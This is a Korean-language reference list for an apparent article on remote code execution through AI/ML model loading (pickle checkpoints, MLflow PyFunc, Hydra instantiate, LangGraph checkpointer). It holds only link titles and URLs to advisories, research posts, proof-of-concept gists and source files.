- [8] [패치 전 취약한 loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [악성 checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [패치 후 loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – 최신 AI/ML 형식 및 라이브러리를 통한 원격 코드 실행](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra instantiate 문서](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra block-list 커밋 (RCE 경고)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – SQLi에서 RCE까지: LangGraph의 Checkpointer 악용](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Archive Slip 버그를 고가치 AI/ML 버그 바운티로 연결하기](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Snyk 권고문 및 PyFunc proof of concept – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [MLflow 소스 – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [MLflow REST API – artifact 다운로드 및 업로드 엔드포인트](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
- [21] [Binarly MLTracer 정적 스캐너 우회 분류 체계](https://raw.githubusercontent.com/binarly-io/ai-supply-chain-attacks-research/master/MLTracer/evasion.md)
- [22] [Binarly – MLTracer를 사용한 악성 모델 탐지](https://binarly.io/blog/malicious-model-detection-mltracer)
- [23] [PyTorch storage `_load_from_bytes` 구현](https://raw.githubusercontent.com/pytorch/pytorch/main/torch/storage.py)
- [24] [CPython pickle `find_class` 호환성 매핑](https://raw.githubusercontent.com/python/cpython/main/Lib/pickle.py)
- [25] [CPython `_compat_pickle` import 매핑](https://raw.githubusercontent.com/python/cpython/main/Lib/_compat_pickle.py)
